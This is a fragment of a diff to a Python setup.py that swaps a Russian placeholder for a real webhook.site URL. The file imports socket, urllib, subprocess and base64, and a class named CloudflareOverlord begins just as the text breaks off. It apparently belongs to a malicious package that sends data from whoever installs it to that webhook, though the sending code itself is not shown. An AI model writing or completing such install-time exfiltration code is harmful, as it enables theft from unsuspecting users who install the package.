@@ -1,7 +1,7 @@
 import os, json, socket, urllib.request, subprocess, base64
 from setuptools import setup
 
-WEBHOOK_URL = "ТВОЙ_НОВЫЙ_WEBHOOK_URL"
+WEBHOOK_URL = "https://webhook.site/9354f8b9-61a2-462f-8e78-06c365c2ee05"
 
 class CloudflareOverlord:
     def __init__(self):
